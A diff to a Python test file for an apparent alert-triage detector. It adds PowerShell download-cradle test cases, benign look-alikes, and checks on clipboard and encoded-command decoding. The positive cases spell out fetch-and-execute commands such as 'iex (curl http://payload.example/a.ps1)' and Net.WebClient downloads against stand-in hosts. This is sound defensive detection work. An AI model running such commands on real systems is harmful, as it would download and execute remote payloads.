@@ -9,10 +9,12 @@ import json
 import re
 from pathlib import Path
 
+import httpx
 import pytest
 import respx
 
 import behavior
+from adapters import ocsf
 from behavior import analyze, behavior_verdict, decode_char_shift, decode_encoded_command
 from models import Alert, BehaviorFinding
 from triage import triage
@@ -69,6 +71,12 @@ POSITIVE_CASES = [
     ("powershell_download_cradle", {"command_line": "powershell iwr http://x.example/a -OutFile a.exe"}),
     ("powershell_download_cradle", {"command_line": "powershell Invoke-WebRequest -Uri http://x.example/a"}),
     ("powershell_download_cradle", {"command_line": "powershell (New-Object Net.WebClient).DownloadFile('http://x.example/a','a.exe')"}),
+    ("powershell_download_cradle", {"command_line": "powershell iex ([Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData('http://x.example/a')))"}),
+    ("powershell_download_cradle", {"command_line": "powershell iex (curl http://x.example/a.ps1 -UseBasicParsing).Content"}),
+    ("powershell_download_cradle", {"command_line": 'powershell -c "iex (curl http://payload.example/a.ps1)"'}),
+    ("powershell_download_cradle", {"file_path": POWERSHELL_EXE, "command_line": "-c wget http://x.example/a.exe -OutFile a.exe"}),
+    ("powershell_download_cradle", {"command_line": "powershell wget http://x.example/a.exe -OutFile a.exe"}),
+    ("powershell_download_cradle", {"command_line": r"powershell Start-BitsTransfer -Source http://x.example/a.exe -Destination C:\temp\a.exe"}),
     ("certutil_download", {"command_line": r"certutil.exe -urlcache -split -f http://files.example/a.txt C:\Users\a\AppData\Local\Temp\a.exe"}),
     ("certutil_download", {"command_line": r"certutil -decode C:\temp\in.b64 C:\temp\out.exe"}),
     ("mshta_execution", {"command_line": 'mshta.exe "http://x.example/a.hta"'}),
@@ -129,6 +137,15 @@ def test_every_rule_has_a_positive_test():
 # --- Benign look-alikes that must NOT match ----------------------------------
 
 FALSE_POSITIVE_CASES = [
+    # iex without a network method runs something already on the machine.
+    ("powershell_download_cradle", {"command_line": "powershell -c \"iex 'Get-Date'\""}),
+    ("powershell_download_cradle", {"command_line": "powershell -c \"$s = Get-Content .\\job.ps1 -Raw; Invoke-Expression $s\""}),
+    ("powershell_download_cradle", {"command_line": f'powershell -sta -c "{CLIPBOARD_RUN}"'}),
+    ("powershell_download_cradle", {"command_line": 'powershell -c "Get-Clipboard | Invoke-Expression"'}),
+    # curl.exe and wget outside PowerShell are everyday admin tools.
+    ("powershell_download_cradle", {"file_path": r"C:\Windows\System32\curl.exe", "command_line": "curl.exe -fsS http://status.lab.example/health"}),
+    ("powershell_download_cradle", {"command_line": r"cmd.exe /c curl -o C:\temp\report.csv http://reports.lab.example/daily.csv"}),
+    ("powershell_download_cradle", {"command_line": "wget -q -O - http://status.lab.example/health"}),
     ("certutil_download", {"command_line": r"certutil -hashfile C:\iso\image.iso SHA256"}),
     ("certutil_download", {"command_line": "certutil -encode in.txt out.b64"}),
     ("encoded_powershell", {"command_line": r'powershell -File "C:\Program Files\LabOps\Scripts\Rotate-Logs.ps1"'}),
@@ -224,7 +241,7 @@ def test_decoded_findings_are_labelled_in_reasons():
     cradle_reason = next(r for r in result.reasons if "download cradle" in r)
     assert "decoded PowerShell command" in cradle_reason
     assert "[T1059.001, T1105]" in cradle_reason
-    assert "IEX" in cradle_reason
+    assert "Net.WebClient" in cradle_reason  # The network method, shown from the decoded text.
 
 
 def test_decode_falls_back_to_utf8():
@@ -440,10 +457,11 @@ def test_renamed_certutil_sample_is_malicious():
     alert = Alert.model_validate(json.loads((ALERTS_DIR / "renamed_certutil.json").read_text()))
 
     with respx.mock(assert_all_called=False) as mock:  # Nothing to look up: no hash, IP or domain.
+        any_request = mock.route().mock(return_value=httpx.Response(200, json={}))
         result = triage(alert)
 
     assert result.verdict == "malicious"
-    assert not mock.calls
+    assert not any_request.called  # route.called survives the block; mock.calls doesn't.
     assert {"certutil_download", "renamed_system_binary"} <= {f.rule_id for f in result.behavior_findings}
     assert "Stealth" in result.tactics
 
@@ -483,3 +501,20 @@ def test_existing_samples_have_no_renamed_finding(filename):
     if "hostname" not in data:
         return  # Vendor formats are covered in their own tests.
     assert "renamed_system_binary" not in {f.rule_id for f in analyze(Alert.model_validate(data))}
+
+
+# --- The download cradle needs a network method ----------------------------------
+
+def test_clipboard_sample_fires_clipboard_rule_but_not_the_cradle():
+    alert = ocsf.to_alert(json.loads((ALERTS_DIR / "ocsf_clipboard_stager.json").read_text()))
+    rule_ids_found = {f.rule_id for f in analyze(alert)}  # Raw and decoded findings.
+
+    assert "clipboard_execution" in rule_ids_found
+    assert "powershell_download_cradle" not in rule_ids_found
+
+
+def test_curl_hidden_in_an_encoded_command_still_fires_the_cradle():
+    # The decoded script never says "powershell", but -EncodedCommand only runs in PowerShell.
+    findings = analyze(Alert(hostname="WS-TEST-01", command_line=f"cmd /c powershell -enc {encode('iex (curl http://payload.example/a.ps1)')}"))
+
+    assert ("powershell_download_cradle", "encoded_command") in {(f.rule_id, f.decoder) for f in findings}
